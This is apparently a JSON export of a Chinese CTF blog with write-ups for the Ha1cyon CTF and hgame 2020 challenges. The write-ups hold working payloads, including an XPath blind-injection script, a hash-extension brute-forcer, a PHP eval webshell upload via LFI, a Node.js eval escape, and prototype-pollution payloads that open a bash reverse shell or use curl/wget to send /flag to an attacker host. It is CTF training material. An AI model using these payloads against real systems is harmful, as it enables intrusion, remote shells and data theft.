[{"title":"links","url":"/2020/07/12/links/","content":"# vidar\nre:[m140](https://www.scizapomi.top/)  \n\nweb:[0x4qe](http://0727.site/)  \n\npwn:[xi4oyu](https://www.xi4oyu.top/)  \n\nre:[r3n0](http://r3n0.top/)  \n \nweb&android:[trotsky](https://altonhe.github.io/)  \n\nweb:[4k1Ra](https://hikawa.ml/)  \n\nweb:[r1nlang](http://47.97.221.205/)\n\nacm&design:[ç¨³èµš](https://wzyxv1n.top/)\n\njava:[r000setta](https://r000setta.github.io/)\n\nweb:[GaMiSon](http://aw.gamison.top/)\n\npwn:[d1gg12](https://www.thesoldierjack.cn/)\n\n# hdu\n[l1near](https://l1near.top/)\n\n"},{"title":"Ha1cyon_CTF","url":"/2020/04/19/Ha1cyon-CTF/","content":"\n# web\n## æŸ¥æºç \nå¦‚é¢˜  \n\n## RealEzPHP\næºç \n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\nååºåˆ—åŒ–  \n$b($a)=>$bæ˜¯ä¸ªå‡½æ•°å    \nflagåœ¨phpinfoé‡Œ  \nä¸è¿‡s:0:\"\";æ˜¯ä¸è¡Œçš„  \n![](01.png)\n```\nO:8:\"HelloPhp\":2:{s:1:\"a\";s:2:\"-1\";s:1:\"b\";s:7:\"phpinfo\";}\n```\n\n## ezlogin\n### å‰å¯¼çŸ¥è¯†\næŠ“åŒ…ä¿¡æ¯å‘ç°xmlè¯·æ±‚=>1.xxe 2.xpathç›²æ³¨  \n[XPathæ³¨å…¥æŒ‡åŒ—](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)  \n[xpathæ³¨å…¥è¯¦è§£](https://www.cnblogs.com/backlion/p/8554749.html)\n![](03.png)\næŸ¥è¯¢è¯­å¥:  \n$query = \"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\";  \n\n1.ä¸‡èƒ½å¯†ç :\n```\n$name => admin' or '1\n$pwd => \n```\n2.ç›²æ³¨\n\nåˆ¤æ–­æ ¹èŠ‚ç‚¹æ•°é‡ï¼š\n```\n$name=>' or count(/)=1 or '1\n```\ncount(/)=nè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™ä»£è¡¨æœ‰nä¸ªæ ¹èŠ‚ç‚¹  \n\nè·å–åå­—é•¿åº¦:\n```\n$name=>' or string-length(name(/*[1]))=n or '1\n```\nè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹åé•¿åº¦ä¸ºn\n\nè·å–å†…å®¹:\n```\n$name=>'or substring(name(/*[1]),1,1)='a' or '1\n```\né€ä¸ªå­—ç¬¦éå†ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ range('a','z')  \nå½“è¿”å›æ­£å¸¸æ—¶å¯ç¡®å®šå…¶å­—ç¬¦\n\n### é¢˜ç›®\nç”¨æˆ·åè¾“å…¥ 'or count(/)=n or '1æµ‹è¯•æ˜¯å¦èƒ½æ³¨å…¥,nä»1å¼€å§‹å– \nå–1æ—¶æ˜¾ç¤ºéæ³•æ“ä½œï¼Œå–2æ˜¾ç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œå­˜åœ¨æ³¨å…¥   \nè„šæœ¬æ¥è‡ª[NPUCTF ezlogin](http://phoebe233.cn/index.php/archives/35/)\n>re.findall(pattern, string, flags=0)  \nè¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºæ•°ç»„\n\n>ç™»å½•ç•Œé¢éœ€è¦ä¿å­˜sessionï¼Œå¦åˆ™ä¼šè¿”å›\"è¯·ç™»å½•\"ä¿¡æ¯ï¼Œæ— æ³•ç™»å½•\n\n```python\nimport requests\nimport re\nsess = requests.session()\nstrs='abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'\nheaders = {'Content-Type':'application/xml'}\nparam='<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />'\n#tokenä¼šè¿‡æœŸå˜åŒ–ï¼Œæ‰€ä»¥ç”¨æ­£åˆ™åŒ¹é…ä»»æ„token\nt=''\nfor i in range(1,50):\n    for s in strs:\n        url='http://ha1cyon-ctf.fun:30015/login.php'\n        token=re.findall(param,sess.get(url).text)[0]\n\n        #str(i)ä»£è¡¨ç¬¬nä¸ªposï¼Œpwdéšæ„å–å€¼\n        #ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹ä¸ºroot\n        #data=\"<username>' or substring(name(/*[1]), '\"+str(i)+\"', 1)='\"+str(s)+\"' or '1</username><password>123</password><token>\"+token+\"</token>\"\n\n        #ç¬¬äºŒä¸ªèŠ‚ç‚¹ä¸ºaccounts\n        #data = \"<username>' or substring(name(/root/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ä¸ºuser\n        #data = \"<username>' or substring(name(/root/accounts/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #éå†[1][2][3],åœ¨userèŠ‚ç‚¹ä¸‹å¾—åˆ°idï¼Œusernameï¼Œpassword\n        #name(/root/accounts/user/*[1])\n        #name(/root/accounts/user/*[2])\n        #name(/root/accounts/user/*[3])\n        #data = \"<username>' or substring(name(/root/accounts/user/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #ä¹‹åå–userä¸‹çš„å­èŠ‚ç‚¹usernameï¼ˆuser[1]ï¼‰ï¼Œå¾—åˆ° gtfly123\n        #å–ç¬¬äºŒä¸ªå­èŠ‚ç‚¹user[2]ç»“æœæ˜¯adm1n\n        #data = \"<username>' or substring(/root/accounts/user[1]/username/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #æ±‚adm1nçš„å¯†ç \n        #data = \"<username>' or substring(/root/accounts/user[2]/password/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n        res=sess.post(url=url,headers=headers,data=data)\n        if 'éæ³•æ“ä½œ' in res.text:\n            t+=s\n            print(t)\n            break\n```\næ ¼å¼ä¸º\n```xml\n<root>\n    <accounts>\n        <user>\n            <id></id>\n            <username>gtfly123</username>\n            <password>xxxxxxxxxx</password>\n        </user>\n        <user>\n            <id></id>\n            <username>adm1n</username>\n            <password>xxxxxxxxx</password>\n        </user>\n    </accounts>\n</root>\n```\nmd5è§£å¯†åç™»å½•åå°ï¼Œæ–‡ä»¶åŒ…å«å¯ç”¨å¤§å°å†™ç»•è¿‡\n```\n/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag\n```\n\n## ezinclude\nhashæ‹“å±•æ”»å‡»,å€ŸåŠ©hashpumpå·¥å…·[HashPump](https://github.com/bwall/HashPump)  \nexample:\n```\ninput:hashpump -s '6d5f807e23db210bc254a28be2d6759a0f5f5d99' --data 'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo' -a '&waffle=liege' -k 14\n\noutput:\n0e41270260895979317fff3898ab85668953aaa2\ncount=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&waffle=liege\n```\n\n~~è¿™é¢˜å¥½åƒå½“æ—¶ç»™äº†ä¸¤ä¸ªhintè¯´æ˜¯å–œæ¬¢æ”¾å‡flag?~~\n![](04.png)\nå¯ä»¥è”æƒ³åˆ°hashæ‹“å±•æ”»å‡»  \nåœ¨cookieé‡Œå¯ä»¥è·å–åˆ°hashå€¼  \nä½†æ˜¯æ²¡æœ‰æä¾›å¯†é’¥é•¿åº¦æ‰€ä»¥éœ€è¦è„šæœ¬çˆ†ç ´  \n```python\nimport os\nimport requests\nfor i in range(1,12):\n    data=os.popen('hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k '+str(i)+' -a admin').read()\n    name=data.split('\\n')[0]\n    password=data.split('\\n')[1].replace('\\\\x','%') #urlencode\n    result=requests.get('http://192.168.0.166/index.php?name='+password+'&pass='+name).text\n    print(result)\n```\nğŸ‘†å®˜æ–¹å†™çš„è„šæœ¬ï¼Œä¸è¿‡å¤ç°çš„æ—¶å€™å¤±è´¥äº†  \n![](05.png)\nå®˜æ–¹åº”è¯¥æ˜¯æƒ³å€ŸåŠ©åŸæœ¬ä¸ä¼ å€¼æ—¶çš„hashå€¼æ¥æ±‚å‡º$nameçš„å€¼  \nä¸è¿‡ç›´æ¥ä¼ nameçš„å€¼ç„¶åå¾—åˆ°å¯¹åº”çš„$passä¹Ÿå¯ä»¥0.0  \n~~åˆæ„Ÿè§‰åˆ°æ€ç»´çš„é™åˆ¶äº†~~\nå¾—åˆ°flflflflag.php  \nè¿›å…¥åæœ‰\n```html\n<html>\n\n<head>\n    <script language=\"javascript\" type=\"text/javascript\">\n        window.location.href=\"404.html\";\n    </script>\n    <title>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend</title>\n</head>\n<>\n\n    <body>\n        include($_GET[\"file\"])</body>\n\n</html>\n```\nåœ¨è¯·æ±‚å¤´é‡Œå¯ä»¥çœ‹è§phpçš„ç‰ˆæœ¬æ˜¯7.0.33  \n[æ–‡ä»¶åŒ…å«çš„ä¸€äº›getshellå§¿åŠ¿](https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/)  \n[LFI via SegmentFault-ç‹ä¸€èˆª](https://www.jianshu.com/p/dfd049924258)\n[è‡ªåŒ…å«,php7segment faultç›¸å…³](https://www.aqniukt.com/article/257)\n>è¿™é‡Œè¦è¯´çš„æ˜¯åœ¨å«æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„åœ°æ–¹ï¼Œä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´php7 segment faultï¼Œå¦‚æœåŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•(<php7.2)ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell\nâ€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤  \n```python\nimport requests\nimport re\nfile_data={\n    'file': \"<?php eval($_POST[1]);\"\n}\nurl=\"http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\ntry:\n    r=requests.post(url=url,files=file_data,allow_redirects=False)\nexcept:\n        print(1)\n```\nå®˜æ–¹è¯´çš„æ˜¯è®¿é—®http://192.168.0.128:8105/dir.php\nå°±å¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶å  \n~~ä½†æ˜¯ä¸èƒ½ç”¨æ‰«æå™¨ä¹Ÿæ²¡æœ‰hint,dir.phpå“ªæ¥çš„~~\nhttp://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=/tmp/phpFqq1b1&1=phpinfo();\nflagåœ¨phpinfo();é‡Œ  \næ‰€ä»¥ğŸ‘†ç›´æ¥è®¿é—®å°±å¥½\n\n## éªŒè¯ğŸ\næºç \n```js\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieSession = require('cookie-session');\n\nconst fs = require('fs');\nconst crypto = require('crypto');\n\nconst keys = require('./key.js').keys;\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n} // 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª\n\nconst template = fs.readFileSync('./index.html').toString();\nfunction render(results) {\n  return template.replace('{{results}}', results.join('<br/>'));\n}\n\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(bodyParser.json());\n\napp.use(cookieSession({\n  name: 'PHPSESSION', // 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§\n  keys\n}));\n\nObject.freeze(Object);\nObject.freeze(Math);\n\napp.post('/', function (req, res) {\n  let result = '';\n  const results = req.session.results || [];\n  const { e, first, second } = req.body;\n  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {\n    if (req.body.e) {\n      try {\n        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\n      } catch (e) {\n        console.log(e);\n        result = 'Wrong Wrong Wrong!!!';\n      }\n      results.unshift(`${req.body.e}=${result}`);\n    }\n  } else {\n    results.unshift('Not verified!');\n  }\n  if (results.length > 13) {\n    results.pop();\n  }\n  req.session.results = results;\n  res.send(render(req.session.results));\n});\n\n// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI\napp.get('/source', function (req, res) {\n  res.set('Content-Type', 'text/javascript;charset=utf-8');\n  res.send(fs.readFileSync('./index.js'));\n});\n\napp.get('/', function (req, res) {\n  res.set('Content-Type', 'text/html;charset=utf-8');\n  req.session.admin = req.session.admin || 0;\n  res.send(render(req.session.results = req.session.results || []))\n});\n\napp.listen(80, '0.0.0.0', () => {\n  console.log('Start listening')\n});\n```\nå‡ºç°\n>app.use(bodyParser.json());æ¥æ”¶jsonè¯·æ±‚\njsonç»•è¿‡  \né¦–å…ˆè¦æ»¡è¶³\n>first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])\n```\n\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}\n```\nè®¾å®šfirstä¸secondçš„lengthå€¼ç›¸ç­‰ï¼Œæœ¬è´¨ä¸Šfirstå’Œsecondåœ¨æ­¤æ—¶æ˜¯ä¸åŒçš„ä¸¤ä¸ªå¯¹è±¡(åœ°å€ä¸åŒ)  \nè€Œå¯¹äºmd5çš„ç›¸ç­‰,ä¸stringç›¸åŠ æ—¶ä¼šå¼ºåˆ¶è½¬æ¢ä¸ºstringï¼Œè€Œfirstä¸secondçš„stringå€¼æ˜¯ç›¸åŒçš„  \nä¹‹åå°è¯•ç»•è¿‡\n```js\nfunction saferEval(str) { //e\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n>stringObject.replace(regexp/substr,replacement)\n>å¦‚æœ regexp å…·æœ‰å…¨å±€æ ‡å¿— gï¼Œé‚£ä¹ˆ replace() æ–¹æ³•å°†æ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­ä¸²ã€‚å¦åˆ™ï¼Œå®ƒåªæ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…å­ä¸²\nå¯¹äº\n```\n(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| \n```\n![](Ha1cyon-CTF/06.png)\n>\\w+åŒ¹é…æ•°å­—å’Œå­—æ¯ä¸‹åˆ’çº¿çš„å¤šä¸ªå­—ç¬¦\né€šè¿‡åŸå‹é“¾å®ç°RCE  \n>æ— æ³•ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²,Math.\\_\\_proto\\_\\_æ— æ³•ç›´æ¥åˆ©ç”¨  \n[Arrow function expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)\n\n```py\ns = f\"return process.mainModule.require('child_process').execSync('cat /flag').toString()\"\na=','.join([str(ord(i)) for i in s])\nprint(a)\n```\npayload:\n```\n{\"e\":\"(Math=>(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)\",\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}}\n```\nMath+1=>Math+å­—ç¬¦ä¸²å¾—åˆ°ä¸€ä¸ªstringç±»å‹çš„å¯¹è±¡(ä¸èƒ½ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²)\n\n# misc\n## æŠ½è±¡å¸¦å¸ˆ\nç¿»è¯‘æˆåœ°çƒäººæ–‡å­—å³å¯\n\n# crypto\n## è¿™æ˜¯ä»€ä¹ˆè§…ğŸ\n![](Ha1cyon-CTF/01.jpg)\nå°å­—ï¼šF1 W1 S22 S21 T12 S11 W1 S13  \nSå’ŒTéƒ½æ˜¯ä¸¤ä½æ•°å…¶ä»–éƒ½æ˜¯ä¸€ä½æ•°ï¼Œæ—¥å†è¡¨ä¸Šä»¥Tï¼ŒSå¼€å¤´çš„æ˜ŸæœŸä¹Ÿæ­£å¥½æœ‰ä¸¤ä¸ªï¼Œæ‰€ä»¥çŒœæµ‹è¿™ä¸ªä¼šä¸æ˜ŸæœŸæ‰€å…³è”    \n\n[æ—¥å†å¯†ç ](https://wenku.baidu.com/view/a01fc4f9f705cc17552709d1?qq-pf-to=pcqq.c2c)  \næ ¹æ®ğŸ‘†å³å¯è§£å‡ºcalendar\n\n## Classical Cipher\né¢˜ç›®\n```\nå‹ç¼©åŒ…å¯†ç ï¼šgsv_pvb_rh_zgyzhs\n\nå¯¹åº”æ˜æ–‡ï¼š   ***_key_**_******\n```\nå·²çŸ¥éƒ¨åˆ†æ˜æ–‡å’Œå…¨éƒ¨å¯†æ–‡æ±‚å…¨éƒ¨æ˜æ–‡  \n'p'-'a'+'k'-'a'=25(å¯¹åº”å…³ç³»)  \n![](Ha1cyon-CTF/02.png)\nçŒªåœˆå¯†ç +éæ–¯çš„è±¡å½¢æ–‡å­—=>    \nåŸæ¥çŒªåœˆå¯†ç æ˜¯å˜å½¢ç‰ˆçš„  \n\n\n","tags":["ctf"]},{"title":"hgame2020week4_wp","url":"/2020/02/18/hgame2020week4-wp/","content":"[hgame_official_wp](https://github.com/vidar-team/Hgame2020_writeup/blob/master/week4/HGAME%202020%20Week4%20Official%20Writeup.pdf)  \n\næ„Ÿè°¢å„ä½å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”ï¼\n\n# web\n## sekiro\n\né¢˜ç›®æä¾›äº†æºç ï¼Œç»“æ„æ˜¯è¿™æ ·çš„  \n![](wp4_img/0sekiro.png)\nçœ‹èµ·æ¥åº”è¯¥æ˜¯è¦è¯»å–flagä¸­çš„å†…å®¹  \nå…ˆçœ‹web\\routes\\index.js\n```javascript\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\nä»[æµ…æJavaScriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»](https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/) å¯ä»¥å¾—çŸ¥æºç ä¸­çš„mergeå’Œcloneä¼šè§¦å‘åŸå‹é“¾æ±¡æŸ“  \n```javascript\nrouter.post('/action', function (req, res) {\n  if (!req.session.sekiro) {\n    res.end(\"Session required.\")\n  }\n  if (!req.session.sekiro.alive) {\n    res.end(\"You dead.\")\n  }\n  var body = JSON.parse(JSON.stringify(req.body));\n  var copybody = clone(body)\n  if (copybody.solution) {\n    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)\n  }\n  res.end(\"æäº¤æˆåŠŸ\")\n})\n```\nå‘ç°æ­¤å¤„è°ƒç”¨äº†cloneå‡½æ•°,åœ¨solutionå­˜åœ¨çš„æƒ…å†µä¸‹ä¼šè°ƒç”¨Game.dealWithAttacks()ï¼Œå†åœ¨\\web\\utilsæŸ¥çœ‹å…·ä½“å†…å®¹  \n```javascript\nthis.dealWithAttacks = function (sekiro, solution) {\n        if (sekiro.attackInfo.solution !== solution) {\n            sekiro.health -= sekiro.attackInfo.attack\n            if (sekiro.attackInfo.additionalEffect) {\n                var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n            }\n        }\n        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500\n        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0\n        if (sekiro.posture == 500 || sekiro.health == 0) {\n            sekiro.alive = false\n        }\n        return sekiro\n    }\n```\nå‘ç°\n```javascript\nvar fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n```\nå¯ä»¥é€šè¿‡æ”¹å˜sekiro.attackInfo.additionalEffectçš„å€¼ï¼Œåœ¨è°ƒç”¨fnæ—¶å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ  \nå¯ä»¥å‘ç°æ¡ä»¶æ˜¯ sekiro.attackInfo.solution !== solution  \nè€Œåœ¨attackä¸­\n```javascript\nthis.attacks = [\n        {\n            \"method\": \"è¿ç»­ç å‡»\",\n            \"attack\": 1000,\n            \"additionalEffect\": \"sekiro.posture+=100\",\n            \"solution\": \"è¿ç»­æ ¼æŒ¡\"\n        },\n        {\n            \"method\": \"æ™®é€šæ”»å‡»\",\n            \"attack\": 500,\n            \"additionalEffect\": \"sekiro.posture+=50\",\n            \"solution\": \"æ ¼æŒ¡\"\n        },\n        {\n            \"method\": \"ä¸‹æ®µæ”»å‡»\",\n            \"attack\": 1000,\n            \"solution\": \"è·³è·ƒè¸©å¤´\"\n        },\n        {\n            \"method\": \"çªåˆºæ”»å‡»\",\n            \"attack\": 1000,\n            \"solution\": \"è¯†ç ´\"\n        },\n        {\n            \"method\": \"å·´ä¹‹é›·\",\n            \"attack\": 1000,\n            \"solution\": \"é›·å\"\n        },\n    ]\n```\né€šè¿‡åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶ï¼Œæˆ‘ä»¬è¦åœ¨æ”»å‡»æ²¡æœ‰additionalEffectå±æ€§æ—¶å‘é€æˆ‘ä»¬çš„payload  \nè¯´å®è¯ä¸çŸ¥é“ä¸ºå•¥è€æ˜¯æ¥æ”¶ä¸åˆ°æ•°æ®...  \n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\": \"return e => { for (var a in {}){delete Object.prototype[a];} return global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/_ip/_port 0>&1\\\"')}\\n\"}}\n```\n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\":\" return e => { for (var a in {}){delete Object.prototype[a];}global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function(){})\"\n}}\n```\nè¿™ä¿©æˆ‘éƒ½å¤±è´¥äº†ï¼Œä½†æ˜¯å­¦é•¿è¯•äº†ç¬¬äºŒä¸ªè¯´æ˜¯å¯ä»¥æ‹¿åˆ°flagçš„?æ„Ÿè§‰æ˜¯æˆ‘æ“ä½œé—®é¢˜...  \nåæ¥åˆ©ç”¨curlæ¥æ‰§è¡Œå‘½ä»¤ç»ˆäºæˆåŠŸäº†ä¸€æ¬¡...  \npayloadæˆåŠŸå˜æˆäº†è¿™æ ·  \n```javascript\n{\n    \"solution\":\"0\",\n    \"__proto__\":{\n        \"additionalEffect\":\"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')\"\n    }\n}\n```\nå…ˆè®¿é—®/info /attackç•Œé¢ï¼Œç¡®å®šæ”»å‡»æ»¡è¶³æ¡ä»¶åï¼Œå†post /actionï¼Œå‘é€payloadï¼Œæœ€åä»apacheæ—¥å¿—é‡Œæ‰¾accessè®°å½•  \nä½†æ˜¯è¿™ä¸ªå¯¹æˆ‘æ¥è¯´ä¹Ÿæ˜¯çœ‹è¿æ°”ï¼Œè¯•äº†Néå°±æˆåŠŸäº†ä¸€æ¬¡...åé¢å†å°è¯•çš„æ—¶å€™åˆæ”¶ä¸åˆ°äº†...  \n\n# èµ›å\n## web\n### ezJava\nå‡ºé¢˜äººä¸€å¼€å§‹ç»™äº†ä¿©ç½‘å€æç¤º\n[Code-Breaking Puzzles â€” javacon WriteUp](http://rui0.cn/archives/1015)\n[jolokia](https://jolokia.org/reference/html/protocol.html)\nå†ç»“åˆä¸‹é¢˜ç›®\n![](wp4_img/5.png)\næ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•è¡¨å•\n![](wp4_img/1.png)\nå…ˆçŒœä¸€ä¸‹username=adminï¼Œpassword=adminï¼Œæ­£å¥½æ˜¯æ­£ç¡®çš„  \n[Spring Boot Actuator ä½¿ç”¨](https://www.jianshu.com/p/af9738634a21)\n[Attack Spring Boot Actuator via jolokia Part 1](https://www.anquanke.com/post/id/173262)\næ ¹æ®ä¸Šé¢è¿™ä¸¤ç¯‡æ–‡ç« ä»¥åŠæç¤ºï¼Œæˆ‘ä»¬è®¿é—®\nhttp://ezspel.hgame.wz22.cc/actuator/env\næ­£å¥½çœ‹è§application.yml\n```\n{\n            \"name\": \"applicationConfig: [classpath:/application.yml]\",\n            \"properties\": {\n                \"server.port\": {\n                    \"value\": 9997,\n                    \"origin\": \"class path resource [application.yml]:2:9\"\n                },\n                \"spring.application.name\": {\n                    \"value\": \"ezSpel\",\n                    \"origin\": \"class path resource [application.yml]:6:7\"\n                },\n                \"management.endpoint.shutdown.enabled\": {\n                    \"value\": false,\n                    \"origin\": \"class path resource [application.yml]:10:16\"\n                },\n                \"management.endpoint.jolokia.config.debug\": {\n                    \"value\": true,\n                    \"origin\": \"class path resource [application.yml]:13:16\"\n                },\n                \"management.endpoints.web.exposure.include\": {\n                    \"value\": \"info,jolokia,env\",\n                    \"origin\": \"class path resource [application.yml]:17:18\"\n                },\n                \"keywords.blacklist[0]\": {\n                    \"value\": \"java.+lang\",\n                    \"origin\": \"class path resource [application.yml]:21:7\"\n                },\n                \"keywords.blacklist[1]\": {\n                    \"value\": \"Runtime\",\n                    \"origin\": \"class path resource [application.yml]:22:7\"\n                },\n                \"keywords.blacklist[2]\": {\n                    \"value\": \"exec.*\\\\(\",\n                    \"origin\": \"class path resource [application.yml]:23:7\"\n                },\n                \"keywords.blacklist[3]\": {\n                    \"value\": \"getClass\",\n                    \"origin\": \"class path resource [application.yml]:24:7\"\n                },\n                \"keywords.blacklist[4]\": {\n                    \"value\": \"forName\",\n                    \"origin\": \"class path resource [application.yml]:25:7\"\n                },\n                \"user.username\": {\n                    \"value\": \"admin\",\n                    \"origin\": \"class path resource [application.yml]:28:13\"\n                },\n                \"user.password\": {\n                    \"value\": \"******\",\n                    \"origin\": \"class path resource [application.yml]:29:13\"\n                },\n                \"user.encParam1\": {\n                    \"value\": \"hgamehgamehgame{\",\n                    \"origin\": \"class path resource [application.yml]:30:14\"\n                },\n                \"user.encParam2\": {\n                    \"value\": \"spppelandjookiaa\",\n                    \"origin\": \"class path resource [application.yml]:31:14\"\n                }\n            }\n        },\n        {\n            \"name\": \"class path resource [application.yml]:class path resource [application.yml]\",\n            \"properties\": {\n                \"ezSpel\": {\n                    \"value\": \"\"\n                },\n                \"include\": {\n                    \"value\": \"info,jolokia,env\"\n                },\n                \"-\": {\n                    \"value\": \"forName\"\n                },\n                \"password\": {\n                    \"value\": \"******\"\n                },\n                \"web\": {\n                    \"value\": \"\"\n                },\n                \"username\": {\n                    